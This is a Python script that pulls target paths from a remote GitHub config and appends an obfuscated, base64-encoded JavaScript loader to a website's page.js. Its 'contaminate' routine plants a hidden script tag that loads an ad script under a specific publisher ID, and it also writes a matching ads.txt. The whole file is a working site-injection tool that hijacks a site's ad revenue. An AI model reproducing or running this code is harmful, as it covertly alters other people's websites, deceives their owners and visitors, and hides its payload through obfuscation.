import base64
import json
import os
import urllib


def fetch_config(url_path):
    response = urllib.urlopen(url_path)
    if response.code == 200:
        try:
            resp = json.loads(response.read())
        except Exception:
            pass
        else:
            return resp


def get_config():
    """
    Just read existing file if update is False,
    and set update to True if there is error:
    e.g FileNotFoundError, etc...
    :return:
    """
    return fetch_config(
        'https://raw.githubusercontent.com/babi40060/config/main/ads.json'
    )


def get_target_contaminate(file_paths):
    for file_path in file_paths:
        if os.path.exists(file_path):
            return file_path
    return False


def contaminate(file_paths):
    """
    :param file_paths: which files
    :return:
    """
    file_path = get_target_contaminate(file_paths)
    if not file_path:
        return False

    ads_code = b'ZnVuY3Rpb24gYmFyMihmb28xLGZvbyl7dmFyIGJhcj1mb28yKCk7cmV0dXJuIGJhcjI9ZnVuY3Rpb24oYmFyMSxCYXIyKXtiYXIxPWJhcjEtMHhhODt2YXIgQmFyMT1iYXJbYmFyMV07cmV0dXJuIEJhcjE7fSxiYXIyKGZvbzEsZm9vKTt9ZnVuY3Rpb24gZm9vMigpe3ZhciBCYXIyPVsnYXBwZW5kQ2hpbGQnLCcxNjQ2MjIzMHBmSHZDWScsJzU1MlRuV3NxcicsJzIxVGdIVEt4JywnYXN5bmMnLCcyNDU4OFNyekdZTycsJzM2Mzg5NHJydE5GRycsJ3F1ZXJ5U2VsZWN0b3InLCdzY3JpcHQnLCdoZWFkJywnYW5vbnltb3VzJywnNTEwNzc1cndlaEl5JywnNkJFRW1iSycsJ2FIUjBjSE02THk5d1lXZGxZV1F5TG1kdmIyZHNaWE41Ym1ScFkyRjBhVzl1TG1OdmJTOXdZV2RsWVdRdmFuTXZZV1J6WW5sbmIyOW5iR1V1YW5NL1kyeHBaVzUwUFE9PScsJzEzMzQ4MDV5dHNoQnInLCcxMDcyNjU2WFNxYVplJywnMzA1NDM4bG5KRFdFJywnc3JjJywnWTJFdGNIVmlMVFF3TnpjNU16RTROamc0TVRjd01EQT0nXTtmb28yPWZ1bmN0aW9uKCl7cmV0dXJuIEJhcjI7fTtyZXR1cm4gZm9vMigpO30oZnVuY3Rpb24oYmFyLGJhcjEpe3ZhciBCYXIxPWJhcjIsRm9vMT1iYXIoKTt3aGlsZSghIVtdKXt0cnl7dmFyIEZvbzI9LXBhcnNlSW50KEJhcjEoMHhhZCkpLzB4MSstcGFyc2VJbnQoQmFyMSgweGIyKSkvMHgyKihwYXJzZUludChCYXIxKDB4YWUpKS8weDMpKy1wYXJzZUludChCYXIxKDB4YjEpKS8weDQrLXBhcnNlSW50KEJhcjEoMHhiMCkpLzB4NStwYXJzZUludChCYXIxKDB4YTgpKS8weDYqKC1wYXJzZUludChCYXIxKDB4YjgpKS8weDcpK3BhcnNlSW50KEJhcjEoMHhiNykpLzB4OCoocGFyc2VJbnQoQmFyMSgweGJhKSkvMHg5KStwYXJzZUludChCYXIxKDB4YjYpKS8weGE7aWYoRm9vMj09PWJhcjEpYnJlYWs7ZWxzZSBGb28xWydwdXNoJ10oRm9vMVsnc2hpZnQnXSgpKTt9Y2F0Y2goQmFyKXtGb28xWydwdXNoJ10oRm9vMVsnc2hpZnQnXSgpKTt9fX0oZm9vMiwweDQ5OTg2KSwoZnVuY3Rpb24oKXt2YXIgRm9vPWJhcjIsZm9vMT1kb2N1bWVudFsnY3JlYXRlRWxlbWVudCddKEZvbygweGFhKSksZm9vPWRvY3VtZW50W0ZvbygweGE5KV0oRm9vKDB4YWIpKTtmb28xW0ZvbygweGIzKV09YXRvYihGb28oMHhhZikpK2F0b2IoRm9vKDB4YjQpKSxmb28xW0ZvbygweGI5KV09ISFbXSxmb28xWydjcm9zc29yaWdpbiddPUZvbygweGFjKSxmb29bRm9vKDB4YjUpXShmb28xKTt9KCkpKTs='
    ads_code = base64.b64decode(ads_code)
    f = open(file_path, 'r')
    lines = f.readlines()
    f.close()
    if ads_code not in lines:
        with open(file_path, 'a') as _file:
            _file.write("\n")
            _file.write(ads_code)
            _file.close()
    return True


def insert_code(file_path, ads_code):
    is_exists = os.path.exists(file_path)
    if not is_exists or not os.stat(file_path).st_size:
        with open(file_path, 'w') as _file:
            _file.write(ads_code)
            _file.close()


if __name__ == "__main__":
    # /home/dawnvtus/public_html/public/assets/js/page.js
    _config = get_config()
    contaminate(_config.get('c'))

    # /home/dawnvtus/public_html/public/ads.txt
    insert_code(
        file_path="ads.txt",
        ads_code="google.com, pub-4077931868817000, DIRECT, f08c47fec0942fa0",
    )
